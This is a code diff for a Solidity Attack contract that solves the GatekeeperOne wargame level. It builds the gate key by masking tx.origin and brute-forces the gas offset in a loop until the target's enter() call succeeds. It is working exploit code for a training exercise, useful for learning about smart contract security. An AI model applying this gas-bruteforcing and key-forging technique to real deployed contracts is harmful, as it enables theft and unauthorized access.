@@ -29,19 +29,21 @@ contract GatekeeperOne {
 
 contract Attack {
     GatekeeperOne gatekeeperOne;
-    bytes8 gateKey;
-    constructor(GatekeeperOne _gatekeeperOne, bytes8 _gateKey) {
+
+    event SuccessOn(uint256 n);
+
+    constructor(GatekeeperOne _gatekeeperOne) {
         gatekeeperOne = _gatekeeperOne;
-        gateKey = _gateKey;
     }
 
     function attack() public {
-        uint256 availableGas = gasleft();
-        
-        // 가스를 8191로 나누어 떨어지도록 설정해야 함
-        uint256 gasToUse = availableGas - (availableGas % 8191) + 8191;  // 나머지가 생기지 않도록 조정
-
-        (bool success, ) = address(gatekeeperOne).call{gas: gasToUse}(abi.encodeWithSignature("enter(bytes8)", gateKey));
-        require(success, "attack fail");
+        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;
+        for (uint i = 16635;i < 16700;i++) {
+            (bool success, ) = address(gatekeeperOne).call{gas: 8191 + i}(abi.encodeWithSignature("enter(bytes8)", gateKey));
+            if(success) {
+                emit SuccessOn(i);
+                return;
+            }
+        }
     }
 }
